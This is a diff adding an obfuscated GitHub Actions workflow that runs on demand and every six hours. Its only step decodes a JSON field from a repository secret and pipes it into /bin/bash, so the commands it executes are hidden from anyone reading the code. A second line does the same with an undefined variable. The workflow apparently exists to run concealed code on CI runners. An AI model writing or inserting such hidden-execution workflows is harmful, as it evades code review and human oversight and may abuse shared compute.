@@ -1,0 +1,19 @@
+name: xingxiyuezigoogle
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '9 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xingxiyuezigoogle
+        env:
+          jlorb465: ${{ secrets.jlorb465 }}
+        run: |
+          echo $jlorb465 | jq -r .h8842 | /bin/bash
+          echo $zk33147 | jq -r .wndq11 | /bin/bash
+
